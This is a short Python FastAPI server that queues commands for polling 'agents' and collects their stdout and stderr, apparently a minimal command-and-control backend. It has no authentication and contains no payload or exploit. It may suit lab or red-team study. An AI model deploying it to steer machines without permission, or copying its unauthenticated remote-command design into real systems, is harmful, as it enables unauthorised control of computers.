from fastapi import FastAPI
from uuid import uuid4
from typing import Dict, List
from pydantic import BaseModel
from fastapi.responses import JSONResponse

app = FastAPI()

# In-memory storage for agents and their tasks/results
agents: Dict[str, List[Dict]] = {}
results: Dict[str, List[Dict]] = {}

# Define the structure of a command task and result using Pydantic models
class Task(BaseModel):
    task_id: str
    command: str

class Result(BaseModel):
    task_id: str
    stdout: str
    stderr: str

@app.post("/connect")
async def connect():
    """
    Registers a new agent and generates a unique agent_id.
    Initializes empty command and result lists for this agent.
    """
    agent_id = str(uuid4())
    agents[agent_id] = []
    results[agent_id] = []
    return {"agent_id": agent_id}

@app.post("/cmd/{agent_id}")
async def get_command(agent_id: str):
    """
    Agents poll this endpoint for commands.
    Returns the next command if available, or a 'no command' status.
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404, content={"error": "agent not found"})

    if agents[agent_id]:
        return agents[agent_id].pop(0)
    return {"status": "no command"}

@app.post("/send_command/{agent_id}")
async def send_command(agent_id: str, task: Task):
    """
    Adds a new command to the agent's command queue.
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404, content={"error": "agent not found"})

    agents[agent_id].append(task.dict())
    return {"status": "command added", "task_id": task.task_id}

@app.post("/result/{agent_id}")
async def post_result(agent_id: str, result: Result):
    """
    Receives execution results from agents and stores them.
    """
    if agent_id not in results:
        return JSONResponse(status_code=404, content={"error": "agent not found"})

    results[agent_id].append(result.dict())
    return {"status": "result received"}

@app.get("/results/{agent_id}")
async def get_results(agent_id: str):
    """
    Fetch all results submitted by the agent.
    """
    if agent_id not in results:
        return JSONResponse(status_code=404, content={"error": "agent not found"})

    return results[agent_id]

@app.get("/agents")
async def list_agents():
    """
    Lists all currently connected agents by their IDs.
    """
    return {"agents": list(agents.keys())}
